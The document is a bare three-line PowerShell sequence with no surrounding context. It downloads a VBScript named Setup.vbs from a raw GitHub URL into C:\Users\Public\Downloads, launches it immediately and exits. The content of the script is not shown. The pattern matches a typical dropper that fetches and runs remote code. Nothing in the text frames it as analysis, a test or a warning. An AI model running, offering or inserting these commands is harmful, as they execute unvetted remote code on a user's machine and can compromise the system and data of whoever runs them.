powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Setup.vbs" -OutFile "C:\Users\Public\Downloads\Setup.vbs"
powershell.exe Start-Process -FilePath "C:\Users\Public\Downloads\Setup.vbs"
powershell.exe exit

